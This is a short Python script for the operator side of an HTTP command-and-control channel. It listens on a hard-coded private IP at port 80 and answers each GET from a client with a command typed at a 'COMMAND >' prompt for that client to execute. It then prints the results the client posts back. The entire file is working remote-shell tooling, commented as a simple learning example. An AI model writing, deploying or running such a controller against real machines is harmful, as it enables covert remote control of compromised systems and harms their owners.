import http.server # create http server 

host = "192.168.190.130" # listening IP
port = 80 # listening PORT 
class reqhandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self): # handle http get from client
        commands = input("COMMAND > ") # command input 
        self.send_response(200)
        self.send_header("Content-type","text/html") # to tell client what is the data 
        self.end_headers()
        self.wfile.write(commands.encode())# to send command via GET method to execute
    def do_POST(self):
        self.send_response(200) # to tell client we got the post without any problem
        self.end_headers()
        length = int(self.headers['Content-length']) # how many byets of data 
        postRedaer = self.rfile.read(length) # to read 
        print(postRedaer.decode())
if __name__ == '__main__':
    runserver = http.server.HTTPServer
    httpd = runserver((host,port),reqhandler)
    try:
        httpd.serve_forever()
    except:
        print("bye :(")